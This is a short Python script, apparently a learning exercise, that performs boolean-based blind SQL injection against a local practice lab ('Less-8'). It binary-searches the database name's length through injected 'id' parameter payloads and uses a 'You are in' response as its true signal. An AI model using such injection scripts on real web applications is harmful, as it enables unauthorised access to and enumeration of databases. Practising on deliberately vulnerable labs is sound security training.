import requests
url = 'http://localhost:8989/Less-8'
n = 200
l = 1
r = 200
while l <= r:
    n = (l + r) // 2
    payload = {"id":f"1' and length(database())={n}#"}
    response = requests.get(url, params=payload)
    if "You are in" in response.text:
        print(f"Database length is: {n}")
        break
    else:
        payload = {"id":f"1' and length(database())<{n}#"}
        response = requests.get(url, params=payload)
        if "You are in" in response.text:
            r = n - 1
        else:
            l = n + 1
# payload = {"id":f"1' and length(database())<{n}#"}
# response = requests.get(url, params=payload)
# if "You are in" in response.text:
#     print(f"Database length is: {n}")
# print(response.text)
# print("-----")
# print("You are in" in response.text)  # 看这里输出 True 还是 False